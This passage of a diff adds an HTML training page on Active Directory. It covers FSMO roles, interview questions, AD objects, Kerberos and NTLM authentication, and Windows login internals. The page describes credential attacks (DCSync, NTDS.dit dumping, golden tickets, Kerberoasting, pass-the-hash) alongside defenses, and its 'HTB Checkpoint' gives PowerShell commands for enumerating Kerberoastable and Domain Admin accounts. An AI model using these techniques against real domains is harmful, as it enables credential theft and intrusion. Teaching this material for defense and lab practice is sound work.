+        <!-- Replication arrow to second DC -->
+        <g class="float float-delay-3">
+          <rect x="550" y="240" width="130" height="64" rx="12" fill="#F5F3FF" stroke="#7C3AED" stroke-width="1.5"/>
+          <text x="615" y="263" text-anchor="middle" font-size="18">🖥️</text>
+          <text x="615" y="282" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#7C3AED" font-weight="700">DC02 (Backup)</text>
+          <text x="615" y="297" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#A855F7">Replication</text>
+        </g>
+        <line x1="480" y1="280" x2="550" y2="280" stroke="#7C3AED" stroke-width="1.5"/>
+        <polygon points="550,280 542,275 542,285" fill="#7C3AED"/>
+        <text x="500" y="272" font-family="system-ui,sans-serif" font-size="9" fill="#7C3AED">AD Replication</text>
+
+      </svg>
+      <div class="diagram-label">Domain Controller — Services, Connections &amp; Role in the Domain</div>
+    </div>
+  </div>
+
+  <!-- FSMO Roles -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-purple">👑</div>
+      <div><div class="block-title">FSMO Roles — The Special DC Jobs</div><div class="block-subtitle">Flexible Single Master Operation roles — one DC must hold each</div></div>
+    </div>
+    <div class="flip-card-grid">
+      <div class="flip-card">
+        <div class="flip-card-inner">
+          <div class="flip-front"><div class="flip-icon">📜</div><h4>Schema Master</h4><p>Forest-wide. Controls AD schema changes.</p><span class="flip-hint">Hover/click to flip →</span></div>
+          <div class="flip-back"><h4>Schema Master</h4><p>Only one per forest. When you extend the AD schema (e.g., installing Exchange), this DC processes the change. Compromise = attacker can add rogue schema attributes.</p></div>
+        </div>
+      </div>
+      <div class="flip-card">
+        <div class="flip-card-inner">
+          <div class="flip-front"><div class="flip-icon">🏷️</div><h4>PDC Emulator</h4><p>Domain-wide. Handles password changes &amp; time sync.</p><span class="flip-hint">Hover/click to flip →</span></div>
+          <div class="flip-back"><h4>PDC Emulator</h4><p>Processes password changes first, provides time sync for Kerberos (max 5 min skew), handles lockouts. Most critical FSMO for day-to-day operations.</p></div>
+        </div>
+      </div>
+      <div class="flip-card">
+        <div class="flip-card-inner">
+          <div class="flip-front"><div class="flip-icon">🔢</div><h4>RID Master</h4><p>Allocates RID pools to DCs for SID creation.</p><span class="flip-hint">Hover/click to flip →</span></div>
+          <div class="flip-back"><h4>RID Master</h4><p>Every security principal (user, group) gets a unique SID. The RID Master distributes pools of RIDs to each DC. Without it, new accounts can't be created.</p></div>
+        </div>
+      </div>
+      <div class="flip-card">
+        <div class="flip-card-inner">
+          <div class="flip-front"><div class="flip-icon">🌐</div><h4>Infrastructure Master</h4><p>Handles cross-domain object references.</p><span class="flip-hint">Hover/click to flip →</span></div>
+          <div class="flip-back"><h4>Infrastructure Master</h4><p>Updates references to objects from other domains. Important in multi-domain forests. Should not be on a Global Catalog server (unless all DCs are GCs).</p></div>
+        </div>
+      </div>
+      <div class="flip-card">
+        <div class="flip-card-inner">
+          <div class="flip-front"><div class="flip-icon">🗺️</div><h4>Domain Naming Master</h4><p>Forest-wide. Manages adding/removing domains.</p><span class="flip-hint">Hover/click to flip →</span></div>
+          <div class="flip-back"><h4>Domain Naming Master</h4><p>Only one per forest. Approves all domain additions and removals. Rarely used but critical when expanding the forest structure.</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Interview Questions -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-amber">🎤</div>
+      <div><div class="block-title">Interview Questions</div><div class="block-subtitle">Expect these in SOC, Pentester, and AD Admin interviews</div></div>
+    </div>
+    <div class="interview-set">
+      <div class="interview-card">
+        <div class="interview-q"><div class="interview-q-num">Q1</div><div class="interview-q-text">What happens if the PDC Emulator goes down?</div></div>
+        <div class="interview-a">Users may experience issues with password changes not propagating immediately. Kerberos authentication may fail if clocks drift beyond 5 minutes (since the PDC Emulator is the authoritative time source). GPO application may also be affected. <strong>Mitigation:</strong> seize the FSMO role to another DC using <code>ntdsutil</code>.</div>
+      </div>
+      <div class="interview-card">
+        <div class="interview-q"><div class="interview-q-num">Q2</div><div class="interview-q-text">What's the difference between a Primary and Backup DC?</div></div>
+        <div class="interview-a">In modern AD (Windows 2000+), all DCs are <strong>multi-master</strong> — they can all handle writes and replicate to each other. The old Primary/Backup DC distinction was from Windows NT 4.0. Today, we have FSMO role holders for specific unique operations, but all DCs are peers for most functions.</div>
+      </div>
+      <div class="interview-card">
+        <div class="interview-q"><div class="interview-q-num">Q3</div><div class="interview-q-text">Why is the Domain Controller the highest-priority target for attackers?</div></div>
+        <div class="interview-a">The DC holds <strong>NTDS.dit</strong> which contains all password hashes for every domain user. Compromising it gives: (1) every user's credentials, (2) ability to create golden/silver tickets, (3) complete control of domain policy, (4) ability to persist via DCSync or skeleton keys. Owning the DC = owning the entire domain.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attacker / Defender -->
+  <div class="content-block">
+    <div class="perspective-split">
+      <div class="perspective-card attacker">
+        <div class="perspective-title">👹 Attacker's Perspective</div>
+        <ul class="perspective-list">
+          <li><strong>DCSync Attack:</strong> Mimic a DC replication request to extract all password hashes without touching NTDS.dit directly</li>
+          <li><strong>NTDS.dit Dump:</strong> Volume Shadow Copy + secretsdump to extract offline</li>
+          <li><strong>Skeleton Key:</strong> Patch LSASS on the DC so any password works for any user</li>
+          <li><strong>Golden Ticket:</strong> Forge TGTs using the KRBTGT hash — persistent for 10 years</li>
+        </ul>
+      </div>
+      <div class="perspective-card defender">
+        <div class="perspective-title">🛡️ Defender's Perspective</div>
+        <ul class="perspective-list">
+          <li>Restrict DC access to Tier 0 admins only — enforce jump servers</li>
+          <li>Enable Credential Guard to protect LSASS</li>
+          <li>Monitor for Directory Replication Service events (Event 4662)</li>
+          <li>Regularly rotate the KRBTGT account password (invalidates golden tickets)</li>
+          <li>Deploy Microsoft Defender for Identity (MDI) on DCs</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 3 — AD OBJECTS
+════════════════════════════════════════ -->
+<section id="ad-objects" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 03</div>
+    <div class="section-tag tag-purple">📦 Core Concepts</div>
+    <h2 class="section-title">Active Directory Objects</h2>
+    <p class="section-subtitle">Every entity in your environment — users, computers, groups, printers — is an AD object with attributes, a unique identifier (SID), and a distinguished name (DN).</p>
+  </div>
+
+  <div class="content-block">
+    <div class="grid-3">
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:var(--blue-50)">👤</div>
+        <h4>User Account</h4>
+        <p>Represents a person or service. Has a SAM account name, UPN, password hash, SID. Can be member of groups. Assigned permissions via groups.</p>
+        <span class="obj-badge pill-blue">Security Principal</span>
+      </div>
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:#F0FDF4">💻</div>
+        <h4>Computer Account</h4>
+        <p>Every domain-joined PC has a computer account ending in <code>$</code> (e.g., WS01$). Has its own password, rotated every 30 days. Can authenticate to the domain like users.</p>
+        <span class="obj-badge pill-green">Machine Identity</span>
+      </div>
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:#F5F3FF">👥</div>
+        <h4>Security Group</h4>
+        <p>Containers for users/computers. Used to assign permissions to resources. Types: Domain Local, Global, Universal. Nest groups for scalability.</p>
+        <span class="obj-badge pill-purple">Access Control</span>
+      </div>
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:var(--amber-100)">🔧</div>
+        <h4>Service Account</h4>
+        <p>Special accounts for services/applications (IIS, SQL, Exchange). Often over-privileged. High-value targets for Kerberoasting. Use MSA/gMSA instead.</p>
+        <span class="obj-badge pill-red">⚠ High Risk</span>
+      </div>
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:#EFF6FF">📁</div>
+        <h4>Organizational Unit</h4>
+        <p>Container for organizing objects. GPOs are linked to OUs. Admins can delegate control at OU level. Not a security boundary — just organizational.</p>
+        <span class="obj-badge pill-blue">Container</span>
+      </div>
+      <div class="object-card" data-tilt>
+        <div class="obj-icon" style="background:#FEF2F2">🖨️</div>
+        <h4>Printer / Shared Resource</h4>
+        <p>Published printers and shared resources appear in AD, enabling users to find them. Less common in modern environments but still present in legacy setups.</p>
+        <span class="obj-badge pill-gray">Resource</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- User attributes deep dive -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-blue">🔍</div>
+      <div><div class="block-title">Inside a User Object — Key Attributes</div></div>
+    </div>
+    <div class="code-block">
+      <pre><span class="cm"># PowerShell: Get all attributes of a user object</span>
+<span class="kw">Get-ADUser</span> <span class="attr">-Identity</span> <span class="str">"alice"</span> <span class="attr">-Properties</span> <span class="str">*</span> | <span class="kw">Select-Object</span> <span class="str">*</span>
+
+<span class="cm"># Key attributes returned:</span>
+<span class="attr">SamAccountName</span>      : alice                   <span class="cm"># Login name (pre-Win2000)</span>
+<span class="attr">UserPrincipalName</span>   : alice@corp.local         <span class="cm"># Email-style login (UPN)</span>
+<span class="attr">DistinguishedName</span>   : CN=alice,OU=Eng,DC=corp,DC=local  <span class="cm"># Full path in AD</span>
+<span class="attr">ObjectSID</span>           : S-1-5-21-2837952793-2699123456-1001  <span class="cm"># Unique security ID</span>
+<span class="attr">MemberOf</span>            : {CN=Developers,OU=Groups...}  <span class="cm"># Group memberships</span>
+<span class="attr">PasswordLastSet</span>     : 06/15/2025                <span class="cm"># When password was changed</span>
+<span class="attr">LastLogonDate</span>       : 06/25/2025                <span class="cm"># Last successful logon</span>
+<span class="attr">BadPwdCount</span>         : 0                         <span class="cm"># Failed login attempts</span>
+<span class="attr">ServicePrincipalName</span>: {}                        <span class="cm"># If set: Kerberoastable!</span></pre>
+    </div>
+  </div>
+
+  <!-- SID Explanation -->
+  <div class="content-block">
+    <div class="callout callout-blue">
+      <span class="callout-icon">🔑</span>
+      <div class="callout-body">
+        <h4>Understanding the Security Identifier (SID)</h4>
+        <p>Every security principal (user, group, computer) has a SID: <code>S-1-5-21-[Domain]-[RID]</code>. The SID <strong>never changes</strong> even if you rename the user. Windows uses SIDs (not names) for all access control decisions. Well-known SIDs: <code>S-1-5-18</code> = SYSTEM, <code>S-1-5-21-...-500</code> = Built-in Administrator, <code>S-1-5-21-...-512</code> = Domain Admins group. Attackers target accounts with high-value SIDs for privilege escalation.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- HTB Checkpoint -->
+  <div class="content-block">
+    <div class="htb-card">
+      <div class="htb-header">
+        <span class="htb-badge">🚩 HTB Checkpoint</span>
+        <span class="htb-title">Enumerating AD Objects</span>
+      </div>
+      <p class="htb-body">Once you have initial access to a domain-joined machine, enumerate objects immediately:</p>
+      <div class="htb-tips">
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>Get-ADUser -Filter * -Properties ServicePrincipalName | Where {$_.ServicePrincipalName}</code> — Find Kerberoastable accounts</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>Get-ADGroupMember "Domain Admins"</code> — Who's a DA?</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><strong>BloodHound + SharpHound:</strong> Graph all object relationships — finds attack paths automatically</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><strong>Look for:</strong> stale accounts (LastLogon &gt; 90 days), weak passwords, over-permissioned service accounts</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 4 — AUTHENTICATION
+════════════════════════════════════════ -->
+<section id="auth-flow" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 04</div>
+    <div class="section-tag tag-blue">🔐 Security Core</div>
+    <h2 class="section-title">Authentication — Kerberos &amp; NTLM</h2>
+    <p class="section-subtitle">How does AD know it's really you? Two protocols handle this: Kerberos (the modern, secure choice) and NTLM (the legacy fallback that attackers love to abuse).</p>
+  </div>
+
+  <!-- Kerberos explanation -->
+  <div class="content-block">
+    <div class="card card-blue">
+      <p class="definition-text">
+        <strong>Kerberos v5</strong> is the primary authentication protocol in Active Directory. Named after the three-headed dog guarding the underworld, it involves three parties: the <em>Client</em>, the <em>Key Distribution Center (KDC)</em> on the DC, and the <em>Service</em>. No passwords travel the network — only encrypted <strong>tickets</strong>.
+      </p>
+    </div>
+  </div>
+
+  <!-- Kerberos Flow SVG -->
+  <div class="content-block">
+    <div class="diagram-wrap">
+      <svg id="kerberos-svg" viewBox="0 0 740 420" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;">
+        <defs>
+          <marker id="arr-blue" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#2563EB"/>
+          </marker>
+          <marker id="arr-purple" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#7C3AED"/>
+          </marker>
+          <marker id="arr-green" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#16A34A"/>
+          </marker>
+          <marker id="arr-orange" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#D97706"/>
+          </marker>
+        </defs>
+
+        <!-- Three principals -->
+        <!-- Client -->
+        <g class="float">
+          <rect x="30" y="60" width="140" height="90" rx="12" fill="#EFF6FF" stroke="#2563EB" stroke-width="2"/>
+          <text x="100" y="90" text-anchor="middle" font-size="24">👤</text>
+          <text x="100" y="110" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#1E40AF" font-weight="700">Client</text>
+          <text x="100" y="126" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#3B82F6">alice@corp.local</text>
+          <text x="100" y="142" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Has: Password</text>
+        </g>
+
+        <!-- KDC / DC -->
+        <g class="float float-delay-1">
+          <rect x="290" y="40" width="160" height="130" rx="12" fill="#F5F3FF" stroke="#7C3AED" stroke-width="2"/>
+          <text x="370" y="72" text-anchor="middle" font-size="24">🏛️</text>
+          <text x="370" y="96" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#6D28D9" font-weight="700">KDC (DC)</text>
+          <text x="370" y="114" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#7C3AED">DC01.corp.local</text>
+          <rect x="310" y="122" width="120" height="18" rx="5" fill="#7C3AED"/>
+          <text x="370" y="134" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#fff" font-weight="600">Authentication Service</text>
+          <rect x="310" y="146" width="120" height="18" rx="5" fill="#6D28D9"/>
+          <text x="370" y="158" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#fff" font-weight="600">Ticket Granting Service</text>
+        </g>
+
+        <!-- Service -->
+        <g class="float float-delay-2">
+          <rect x="570" y="60" width="140" height="90" rx="12" fill="#FFF7ED" stroke="#D97706" stroke-width="2"/>
+          <text x="640" y="90" text-anchor="middle" font-size="24">🗄️</text>
+          <text x="640" y="110" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#92400E" font-weight="700">Service</text>
+          <text x="640" y="126" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#D97706">FS01.corp.local</text>
+          <text x="640" y="142" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">File Server / App</text>
+        </g>
+
+        <!-- Step 1: AS-REQ -->
+        <line class="kerb-line" x1="170" y1="95" x2="290" y2="95" stroke="#2563EB" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+        <rect x="196" y="76" width="80" height="20" rx="4" fill="#EFF6FF" stroke="#BFDBFE"/>
+        <text x="236" y="90" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#1E40AF" font-weight="700">① AS-REQ</text>
+        <text x="236" y="115" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#64748B">"Who I am" + timestamp</text>
+
+        <!-- Step 2: AS-REP (TGT) -->
+        <line class="kerb-line" x1="290" y1="120" x2="170" y2="120" stroke="#7C3AED" stroke-width="1.5" marker-end="url(#arr-purple)"/>
+        <rect x="190" y="128" width="96" height="20" rx="4" fill="#F5F3FF" stroke="#DDD6FE"/>
+        <text x="238" y="142" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#6D28D9" font-weight="700">② AS-REP (TGT)</text>
+        <text x="238" y="158" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#64748B">Ticket Granting Ticket</text>
+
+        <!-- Step 3: TGS-REQ -->
+        <line class="kerb-line" x1="170" y1="168" x2="290" y2="145" stroke="#2563EB" stroke-width="1.5" marker-end="url(#arr-blue)"/>
+        <rect x="200" y="168" width="84" height="20" rx="4" fill="#EFF6FF" stroke="#BFDBFE"/>
+        <text x="242" y="182" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#1E40AF" font-weight="700">③ TGS-REQ</text>
+        <text x="242" y="195" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#64748B">TGT + service request</text>
+
+        <!-- Step 4: TGS-REP -->
+        <line class="kerb-line" x1="290" y1="165" x2="170" y2="190" stroke="#7C3AED" stroke-width="1.5" marker-end="url(#arr-purple)"/>
+        <rect x="186" y="206" width="96" height="20" rx="4" fill="#F5F3FF" stroke="#DDD6FE"/>
+        <text x="234" y="220" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#6D28D9" font-weight="700">④ TGS-REP (ST)</text>
+        <text x="234" y="233" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#64748B">Service Ticket issued</text>
+
+        <!-- Step 5: AP-REQ -->
+        <line class="kerb-line" x1="170" y1="235" x2="570" y2="100" stroke="#16A34A" stroke-width="1.5" marker-end="url(#arr-green)" stroke-dasharray="6,3"/>
+        <text x="370" y="218" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#16A34A" font-weight="700">⑤ AP-REQ (Service Ticket presented to Service)</text>
+
+        <!-- Step 6: AP-REP -->
+        <line class="kerb-line" x1="570" y1="125" x2="170" y2="255" stroke="#D97706" stroke-width="1.5" marker-end="url(#arr-orange)" stroke-dasharray="6,3"/>
+        <text x="370" y="272" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#D97706" font-weight="700">⑥ AP-REP — Access Granted! 🎉</text>
+
+        <!-- Legend box -->
+        <rect x="30" y="310" width="680" height="88" rx="10" fill="#F8FAFC" stroke="#E2E8F0"/>
+        <text x="380" y="330" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#64748B" font-weight="700" letter-spacing=".06em">KEY CONCEPTS</text>
+        <text x="80"  y="350" font-family="system-ui,sans-serif" font-size="10" fill="#334155"><tspan font-weight="700" fill="#2563EB">AS-REQ/REP:</tspan> Initial login request — KDC issues TGT encrypted with KRBTGT hash</text>
+        <text x="80"  y="368" font-family="system-ui,sans-serif" font-size="10" fill="#334155"><tspan font-weight="700" fill="#7C3AED">TGS-REQ/REP:</tspan> Client asks KDC for a Service Ticket using TGT — KDC verifies and issues ST</text>
+        <text x="80"  y="386" font-family="system-ui,sans-serif" font-size="10" fill="#334155"><tspan font-weight="700" fill="#16A34A">AP-REQ/REP:</tspan> Client presents Service Ticket to Service — no DC involved! Direct auth.</text>
+      </svg>
+      <div class="diagram-label">Kerberos v5 Authentication Flow — 6 Steps to Access</div>
+    </div>
+  </div>
+
+  <!-- NTLM vs Kerberos -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-red">⚔️</div>
+      <div><div class="block-title">Kerberos vs NTLM — Side by Side</div></div>
+    </div>
+    <div class="card">
+      <table class="compare-table">
+        <thead>
+          <tr><th>Feature</th><th>Kerberos v5</th><th>NTLM</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Introduced</td><td>Windows 2000</td><td>Windows NT 3.1 (1993)</td></tr>
+          <tr><td>Mechanism</td><td>Ticket-based (TGT → ST)</td><td>Challenge-Response (3-way handshake)</td></tr>
+          <tr><td>DC Involvement</td><td>Only for ticket issuance</td><td>DC verifies every authentication</td></tr>
+          <tr><td>Mutual Auth</td><td class="check-cell">✅ Yes</td><td class="cross-cell">❌ No (client only)</td></tr>
+          <tr><td>Pass-the-Hash</td><td class="cross-cell">❌ Not directly</td><td class="check-cell">✅ Easily exploited</td></tr>
+          <tr><td>AS-REP Roasting</td><td class="check-cell">✅ Attackable</td><td class="cross-cell">❌ N/A</td></tr>
+          <tr><td>Used When</td><td>Domain-joined, by IP name</td><td>Workgroup, legacy apps, IP address</td></tr>
+          <tr><td>Security</td><td>🟢 Preferred</td><td>🔴 Legacy — disable if possible</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Attack callout -->
+  <div class="content-block">
+    <div class="grid-2">
+      <div class="callout callout-red">
+        <span class="callout-icon">🎣</span>
+        <div class="callout-body">
+          <h4>Kerberoasting</h4>
+          <p>Any authenticated user can request a Service Ticket for any account with a ServicePrincipalName (SPN). The ST is encrypted with the <strong>service account's password hash</strong>. Attacker requests it and <strong>cracks offline</strong>. Mitigation: use long random passwords or gMSA for service accounts.</p>
+        </div>
+      </div>
+      <div class="callout callout-amber">
+        <span class="callout-icon">💀</span>
+        <div class="callout-body">
+          <h4>Pass-the-Hash (NTLM)</h4>
+          <p>NTLM only needs the <strong>NT hash</strong> — not the plaintext password. After dumping LSASS or NTDS.dit, an attacker uses the hash directly to authenticate as that user. Tools: <code>pth-winexe</code>, <code>impacket</code>, <code>mimikatz</code>. Mitigation: enable Protected Users group, disable NTLM where possible.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="perspective-split">
+      <div class="perspective-card attacker">
+        <div class="perspective-title">👹 Attacker's Perspective</div>
+        <ul class="perspective-list">
+          <li>Kerberoasting: Request service tickets for SPN accounts, crack offline</li>
+          <li>AS-REP Roasting: Target accounts with pre-auth disabled</li>
+          <li>Pass-the-Hash: Use NTLM hashes instead of passwords</li>
+          <li>Golden Ticket: Forge TGTs with stolen KRBTGT hash (persists 10 years)</li>
+          <li>Silver Ticket: Forge Service Tickets with service account hash</li>
+        </ul>
+      </div>
+      <div class="perspective-card defender">
+        <div class="perspective-title">🛡️ Defender's Perspective</div>
+        <ul class="perspective-list">
+          <li>Require Kerberos pre-authentication for all accounts</li>
+          <li>Use Managed Service Accounts (gMSA) — auto-rotating 240-char passwords</li>
+          <li>Disable NTLM where not needed (use NTLMv2 minimum if needed)</li>
+          <li>Monitor Event ID 4769 (TGS requests) for unusual volume</li>
+          <li>Rotate KRBTGT password twice after any suspected compromise</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 5 — HOW LOGIN WORKS
+════════════════════════════════════════ -->
+<section id="login-proc" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 05</div>
+    <div class="section-tag tag-indigo">🔑 Internal Working</div>
+    <h2 class="section-title">How Login Works — Internally</h2>
+    <p class="section-subtitle">From the moment you press Enter on your password to the desktop appearing — here's every step Windows takes, every process involved, and every security check performed.</p>
+  </div>
+
+  <div class="content-block">
+    <div class="diagram-wrap" style="background:linear-gradient(160deg,#F8FAFF,#F5F3FF);">
+      <svg id="auth-flow-svg" viewBox="0 0 740 320" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;">
+        <defs>
+          <linearGradient id="step-grad" x1="0%" y1="0%" x2="0%" y2="100%">
+            <stop offset="0%" style="stop-color:#2563EB"/>
+            <stop offset="100%" style="stop-color:#4F46E5"/>
+          </linearGradient>
+        </defs>
+
+        <!-- Flow nodes (horizontal) -->
+        <!-- 1 Keyboard -->
+        <g class="flow-node fade-node">
+          <rect x="10" y="110" width="78" height="60" rx="10" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.5"/>
+          <text x="49" y="134" text-anchor="middle" font-size="18">⌨️</text>
+          <text x="49" y="152" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#334155" font-weight="700">Keyboard</text>
+          <text x="49" y="164" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#94A3B8">Input</text>
+        </g>
+        <!-- Arrow 1 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="88" y1="140" x2="100" y2="140" stroke="#CBD5E1" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="100,136 108,140 100,144" fill="#CBD5E1"/>
+        </g>
+        <!-- 2 Winlogon -->
+        <g class="flow-node fade-node">
+          <rect x="108" y="110" width="78" height="60" rx="10" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.5"/>
+          <text x="147" y="134" text-anchor="middle" font-size="18">🪟</text>
+          <text x="147" y="152" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#1E40AF" font-weight="700">Winlogon</text>
+          <text x="147" y="164" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#3B82F6">SAS Handler</text>
+        </g>
+        <!-- Arrow 2 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="186" y1="140" x2="198" y2="140" stroke="#2563EB" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="198,136 206,140 198,144" fill="#2563EB"/>
+        </g>
+        <!-- 3 LSASS -->
+        <g class="flow-node fade-node">
+          <rect x="206" y="100" width="86" height="80" rx="10" fill="#FEF2F2" stroke="#EF4444" stroke-width="2"/>
+          <text x="249" y="128" text-anchor="middle" font-size="18">⚙️</text>
+          <text x="249" y="148" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#DC2626" font-weight="700">LSASS</text>
+          <text x="249" y="162" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#EF4444">lsass.exe</text>
+          <text x="249" y="174" text-anchor="middle" font-family="system-ui,sans-serif" font-size="7" fill="#94A3B8">⚠ Dump Target</text>
+        </g>
+        <!-- Arrow 3 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="292" y1="140" x2="304" y2="140" stroke="#EF4444" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="304,136 312,140 304,144" fill="#EF4444"/>
+        </g>
+        <!-- 4 Kerberos/NTLM -->
+        <g class="flow-node fade-node">
+          <rect x="312" y="110" width="86" height="60" rx="10" fill="#F5F3FF" stroke="#7C3AED" stroke-width="1.5"/>
+          <text x="355" y="134" text-anchor="middle" font-size="18">🔐</text>
+          <text x="355" y="152" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#6D28D9" font-weight="700">Kerberos</text>
+          <text x="355" y="164" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#7C3AED">or NTLM</text>
+        </g>
+        <!-- Arrow 4 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="398" y1="140" x2="410" y2="140" stroke="#7C3AED" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="410,136 418,140 410,144" fill="#7C3AED"/>
+        </g>
+        <!-- 5 DC -->
+        <g class="flow-node fade-node">
+          <rect x="418" y="96" width="86" height="88" rx="10" fill="#0F172A" stroke="#4F46E5" stroke-width="2"/>
+          <text x="461" y="124" text-anchor="middle" font-size="18">🖥️</text>
+          <text x="461" y="145" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#E2E8F0" font-weight="700">Domain</text>
+          <text x="461" y="158" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#E2E8F0" font-weight="700">Controller</text>
+          <text x="461" y="174" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#9FE870">KDC + NTDS</text>
+        </g>
+        <!-- Arrow 5 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="504" y1="140" x2="516" y2="140" stroke="#4F46E5" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="516,136 524,140 516,144" fill="#4F46E5"/>
+        </g>
+        <!-- 6 Token -->
+        <g class="flow-node fade-node">
+          <rect x="524" y="110" width="82" height="60" rx="10" fill="#F0FDF4" stroke="#22C55E" stroke-width="1.5"/>
+          <text x="565" y="134" text-anchor="middle" font-size="18">🎟️</text>
+          <text x="565" y="152" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#15803D" font-weight="700">Access Token</text>
+          <text x="565" y="164" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#22C55E">SID + Groups</text>
+        </g>
+        <!-- Arrow 6 -->
+        <g class="fade-node">
+          <line class="flow-arrow" x1="606" y1="140" x2="618" y2="140" stroke="#22C55E" stroke-width="1.5"/>
+          <polygon class="flow-arrow" points="618,136 626,140 618,144" fill="#22C55E"/>
+        </g>
+        <!-- 7 Desktop -->
+        <g class="flow-node fade-node">
+          <rect x="626" y="110" width="82" height="60" rx="10" fill="#FFF7ED" stroke="#F59E0B" stroke-width="1.5"/>
+          <text x="667" y="134" text-anchor="middle" font-size="18">🖥️</text>
+          <text x="667" y="152" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#92400E" font-weight="700">Desktop</text>
+          <text x="667" y="164" text-anchor="middle" font-family="system-ui,sans-serif" font-size="8" fill="#D97706">Session Ready</text>
+        </g>
+
+        <!-- Step labels below -->
+        <text x="49"  y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 1</text>
+        <text x="147" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 2</text>
+        <text x="249" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 3</text>
